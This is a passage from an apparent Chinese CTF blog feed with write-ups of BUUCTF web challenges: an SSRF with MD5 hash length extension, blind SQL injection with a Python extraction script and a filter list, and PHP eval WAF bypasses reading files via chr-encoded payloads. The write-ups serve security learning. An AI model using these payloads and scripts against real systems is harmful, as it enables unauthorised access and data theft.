class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点击即可看见flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;"</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>网鼎杯2018</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录4</title>
    <url>/2019/12/28/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%954/</url>
    <content><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>大致了解flask框架，<a href="http://www.security-database.com/detail.php?alert=CVE-2019-9948" target="_blank" rel="noopener">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">哈希长度扩展攻击</a> 。</p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>
<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))  <span class="comment"># urllib.unquote 相当与  urldecode</span></span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class="comment">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>
<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>
<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>
<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>
<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>
<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>
<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: action&#x3D;readscan; sign&#x3D;0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\n&quot;}</code></p>
<h3 id="0x02-另一种解法"><a href="#0x02-另一种解法" class="headerlink" title="0x02 另一种解法"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>
<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>
<p>求<code>（secret+flag.txt+scanread）</code></p>
<p>经过测试密钥是16位 加上scanread是24位。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;tmp&#x2F;HashPump# hashpump </span><br><span class="line">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class="line">Input Data: scan   #写上原有数据</span><br><span class="line">Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度</span><br><span class="line">Input Data to Add: read   #拓展的数据</span><br><span class="line">46a6ff04f7bede58de30e93410935976 #生成的MD5</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure>

<p><code>burp suite</code>提交的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie:action&#x3D;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign&#x3D;46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>

<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\n&quot;}</code></p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>buuctf</tag>
        <tag>De1CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录3</title>
    <url>/2019/12/27/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</url>
    <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\t、/**/、()</code>绕过。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class="line">ascii(char)</span><br><span class="line">substr（str,pos,len)</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题目提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>

<p>访问页面</p>
<p><img src="/pic/3.jpg" alt=""></p>
<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>
<table>
<thead>
<tr>
<th align="center">%20</th>
<th>482</th>
<th>SQL Injection Checked</th>
</tr>
</thead>
<tbody><tr>
<td align="center">AND</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">DELETE</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">END-EXEC</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">GROUP</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">INSERT</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">INTO</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">LIMIT</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">OR</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">UNION</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">UPDATE</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">+</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">/</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">-</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">*</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">`</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">“</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">||</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">%23</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center">;</td>
<td>482</td>
<td>SQL Injection Checked</td>
</tr>
<tr>
<td align="center"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 12&#x2F;27&#x2F;2019 6:11 PM</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for x in range(1, 43):</span><br><span class="line">    high &#x3D; 126</span><br><span class="line">    low &#x3D; 45</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    while high - low &gt; 1:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x, mid)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        res &#x3D; requests.post(url, data &#x3D; data)</span><br><span class="line">        if &#39;Hello&#39; in res.text:</span><br><span class="line">            low &#x3D; mid</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line"></span><br><span class="line">    if high - low &#x3D;&#x3D; 1:</span><br><span class="line">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&quot; % (x, high)</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;id&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class="line">        if &#39;Hello&#39; in response.text:</span><br><span class="line">            result +&#x3D; chr(int(mid+1))</span><br><span class="line">        else :</span><br><span class="line">            result +&#x3D; chr(int(mid))</span><br><span class="line">    else :</span><br><span class="line">        result +&#x3D; chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;a</span><br><span class="line">flag&#123;a2</span><br><span class="line">flag&#123;a22</span><br><span class="line">flag&#123;a22c</span><br><span class="line">flag&#123;a22cf</span><br><span class="line">flag&#123;a22cf6</span><br><span class="line">flag&#123;a22cf69</span><br><span class="line">flag&#123;a22cf690</span><br><span class="line">flag&#123;a22cf690-</span><br><span class="line">flag&#123;a22cf690-3</span><br><span class="line">flag&#123;a22cf690-34</span><br><span class="line">flag&#123;a22cf690-342</span><br><span class="line">flag&#123;a22cf690-342a</span><br><span class="line">flag&#123;a22cf690-342a-</span><br><span class="line">flag&#123;a22cf690-342a-4</span><br><span class="line">flag&#123;a22cf690-342a-4b</span><br><span class="line">flag&#123;a22cf690-342a-4bf</span><br><span class="line">flag&#123;a22cf690-342a-4bf4</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-8</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-88</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class="line">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>

<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>ciscn</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录2</title>
    <url>/2019/12/26/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</url>
    <content><![CDATA[<h2 id="Roarctf-easy-calc"><a href="#Roarctf-easy-calc" class="headerlink" title="[Roarctf]easy_calc"></a>[Roarctf]easy_calc</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_get_contents</span><br><span class="line">readfile</span><br><span class="line">file</span><br></pre></td></tr></table></figure>

<p>目录扫描函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scandir</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>字符转换函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class="line">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>

<p>输出函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump()</span><br><span class="line">printf()</span><br></pre></td></tr></table></figure>

<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>
<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:<span class="string">"calc.php?num="</span>+encodeURIComponent($(<span class="string">"#content"</span>).val()),</span><br><span class="line">            type:<span class="string">'GET'</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span><br><span class="line">                $("#result").html(`&lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">                alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>进入calc.php,进行代码审计。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;    </span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);<span class="comment">//如果包含黑名单中的字符，程序退出</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入urldecode后。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，纤细介绍查看<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">参考连接</a>。</p>
<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>

<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>buuoj</tag>
        <tag>web</tag>
        <tag>Roarctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录1</title>
    <url>/2019/12/23/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/</url>
    <content><![CDATA[<h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<p>PHP序列化<a href="https://www.php.cn/php-notebook-239422.html" target="_blank" rel="noopener">参考文章</a></p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>
